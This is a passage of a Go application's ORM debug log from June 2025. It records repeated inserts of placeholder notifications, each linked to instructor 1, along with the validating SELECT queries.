[0m[33m[10.054ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.218','2025-06-09 14:07:57.218',NULL,1,59) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.732ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.226','2025-06-09 14:07:57.226',NULL,'JOXmuRjsLUuUMNoZPebz','system','2025-06-09 14:07:57.226',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.897ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.585ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 60 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[9.838ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.234','2025-06-09 14:07:57.234',NULL,1,60) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.730ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.242','2025-06-09 14:07:57.242',NULL,'LVXaNxhavWwFjOGjnyhW','system','2025-06-09 14:07:57.241',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.501ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.514ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 61 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[11.807ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.253','2025-06-09 14:07:57.253',NULL,1,61) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.196ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.259','2025-06-09 14:07:57.259',NULL,'WuVVSPuUAISrpLSktpxz','system','2025-06-09 14:07:57.259',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.498ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.466ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 62 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[6.933ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.268','2025-06-09 14:07:57.268',NULL,1,62) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.453ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.275','2025-06-09 14:07:57.275',NULL,'EKKjppUoXAAXiQJIhrjm','system','2025-06-09 14:07:57.275',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.482ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.563ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 63 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[8.881ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.282','2025-06-09 14:07:57.282',NULL,1,63) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[8.952ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.29','2025-06-09 14:07:57.29',NULL,'XmkrQbOxhrtEyxutnEfs','system','2025-06-09 14:07:57.29',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.507ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.600ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 64 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[8.710ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.302','2025-06-09 14:07:57.302',NULL,1,64) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.700ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.308','2025-06-09 14:07:57.308',NULL,'rUJfvsMabyViECobnDIq','system','2025-06-09 14:07:57.308',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.573ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.556ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 65 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[10.100ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.315','2025-06-09 14:07:57.315',NULL,1,65) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.361ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.324','2025-06-09 14:07:57.324',NULL,'ceSMHawmlPNTtnxXPmJf','system','2025-06-09 14:07:57.324',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.453ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.927ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 66 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[7.054ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.333','2025-06-09 14:07:57.333',NULL,1,66) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.656ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.339','2025-06-09 14:07:57.339',NULL,'AjzNdDrbcAFgRPljzVZZ','system','2025-06-09 14:07:57.338',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.591ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.547ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 67 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[9.006ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.346','2025-06-09 14:07:57.346',NULL,1,67) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.534ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.353','2025-06-09 14:07:57.353',NULL,'gnLbHcloNxMJxqvPYmxg','system','2025-06-09 14:07:57.353',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[4.760ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.530ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 68 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[14.629ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.367','2025-06-09 14:07:57.367',NULL,1,68) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.921ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.375','2025-06-09 14:07:57.375',NULL,'GxSPBHSeUiemTADCUgOL','system','2025-06-09 14:07:57.375',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.485ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.722ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 69 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[7.594ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.382','2025-06-09 14:07:57.382',NULL,1,69) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[10.749ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.389','2025-06-09 14:07:57.389',NULL,'CumYNXbDRWXlChGWQwSM','system','2025-06-09 14:07:57.389',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.557ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.586ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 70 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[7.763ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.401','2025-06-09 14:07:57.401',NULL,1,70) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.109ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.408','2025-06-09 14:07:57.408',NULL,'IymEYYbudWYShTUiKruX','system','2025-06-09 14:07:57.408',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.553ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.601ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 71 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[11.115ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.417','2025-06-09 14:07:57.417',NULL,1,71) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.888ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.425','2025-06-09 14:07:57.425',NULL,'mWzjQPJawaLNUMNaFjCs','system','2025-06-09 14:07:57.425',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.492ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.547ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 72 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[7.638ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.432','2025-06-09 14:07:57.432',NULL,1,72) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.812ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.439','2025-06-09 14:07:57.439',NULL,'kHQtCmcEMSyfYfCZZDAc','system','2025-06-09 14:07:57.439',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.517ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.547ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 73 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[7.013ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.446','2025-06-09 14:07:57.446',NULL,1,73) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[12.136ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.454','2025-06-09 14:07:57.454',NULL,'guPDbTYluioaJXmPWgJs','system','2025-06-09 14:07:57.453',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.511ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.573ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 74 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[7.277ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.465','2025-06-09 14:07:57.465',NULL,1,74) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.138ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.471','2025-06-09 14:07:57.471',NULL,'zWJPOeqYiVdZDYMxfpOL','system','2025-06-09 14:07:57.471',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.645ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.525ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 75 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[10.672ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.481','2025-06-09 14:07:57.481',NULL,1,75) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.098ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.488','2025-06-09 14:07:57.488',NULL,'WHCAMzkSNjhxmWpHXpRx','system','2025-06-09 14:07:57.488',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.526ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.575ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 76 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[8.277ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.496','2025-06-09 14:07:57.496',NULL,1,76) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.548ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.504','2025-06-09 14:07:57.504',NULL,'aQpHjWRYYjyRPEPqSVto','system','2025-06-09 14:07:57.503',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[9.501ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.502ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 77 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[18.949ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.524','2025-06-09 14:07:57.524',NULL,1,77) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.686ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.53','2025-06-09 14:07:57.53',NULL,'CXTPYQydUihcynOSptDf','system','2025-06-09 14:07:57.53',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.514ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.499ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 78 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[27.073ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.541','2025-06-09 14:07:57.541',NULL,1,78) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.635ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.565','2025-06-09 14:07:57.565',NULL,'ddYyuwaOdAuhkjeHNvCo','system','2025-06-09 14:07:57.565',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.611ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

